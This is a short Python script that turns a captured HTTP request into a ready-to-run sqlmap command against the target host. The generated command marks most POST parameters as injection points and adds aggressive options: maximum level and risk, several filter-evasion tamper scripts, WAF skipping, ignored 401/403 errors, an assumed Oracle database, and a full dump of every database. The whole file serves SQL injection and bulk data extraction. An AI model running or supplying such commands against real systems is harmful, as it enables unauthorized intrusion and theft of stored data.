import sys
import re
from urllib.parse import urlparse, parse_qs, urlencode

def parse_http_request(request_text):
    lines = request_text.strip().split('\n')
    # Extract method, path, protocol
    first_line = lines[0].strip()
    method, path, _ = re.split(r'\s+', first_line)
    # Find Host
    host = next((line.split(':', 1)[1].strip() for line in lines if line.lower().startswith('host:')), None)
    if not host:
        raise ValueError("Host not found in request")
    # Build full URL
    scheme = 'https'  
    url = f"{scheme}://{host}{path}"
    # Extract headers
    headers = {}
    body_start = None
    for i, line in enumerate(lines[1:]):
        if not line.strip():  # Empty line separates headers and body
            body_start = i + 2  # Adjust for indexing
            break
        if ':' in line:
            key, value = line.split(':', 1)
            headers[key.strip().lower()] = value.strip()
    # Extract body if POST
    data = None
    if method == 'POST' and body_start is not None:
        body_lines = lines[body_start:]
        body = ''.join(body_lines).strip()  # Handle multi-line bodies
        if body:
            data = body
    return method, url, headers, data

def build_sqlmap_command(method, url, headers, data):
    # Extract cookie if present
    cookie_header = headers.get('cookie')
    cookie_str = f'--cookie="{cookie_header}"' if cookie_header else ''
    # Build headers string, exclude Cookie, Content-Length, Host, Connection
    headers_list = []
    for k, v in headers.items():
        if k.lower() not in ['cookie', 'content-length', 'host', 'connection', 'user-agent']:  # Handle UA
            headers_list.append(f"{k.capitalize()}: {v}")
    ua = headers.get('user-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0')
    headers_str = '\\n'.join([f"User-Agent: {ua}"] + headers_list)
    headers_cmd = f'--headers="{headers_str}"' if headers_str else ''
    # Build data with * on injectable params (assume all non-empty values)
    data_cmd = ''
    if data:
        # Parse and mark
        params_dict = parse_qs(data, keep_blank_values=True)
        marked_params = {}
        for key, values in params_dict.items():
            # Assume first value; mark if non-numeric/stringy
            value = values[0]
            if value and not value.isdigit():  # Mark likely injectable
                marked_params[key] = f"{value}*"
            else:
                marked_params[key] = value
        data_str = urlencode(marked_params, doseq=True)
        data_cmd = f'--data="{data_str}"'
    # Standard flags (Oracle-tuned, high evasion)
    flags = '--batch --level=5 --risk=3 --threads=8 --tamper=space2comment,apostrophemask,apostrophenullencode,charencode,randomcase,between --random-agent --skip-waf --ignore-code=401,403,406 --delay=1 --dbms=Oracle --dump-all'
    # Assemble
    command = f'sqlmap -u "{url}" --method={method} {data_cmd} {cookie_str} {headers_cmd} {flags}'.strip()
    return command

if __name__ == '__main__':
    if len(sys.argv) > 1:
        with open(sys.argv[1], 'r') as f:
            request_text = f.read()
    else:
        request_text = sys.stdin.read()
    try:
        method, url, headers, data = parse_http_request(request_text)
        command = build_sqlmap_command(method, url, headers, data)
        print(command)
    except Exception as e:
        print(f"Error parsing request: {e}", file=sys.stderr)
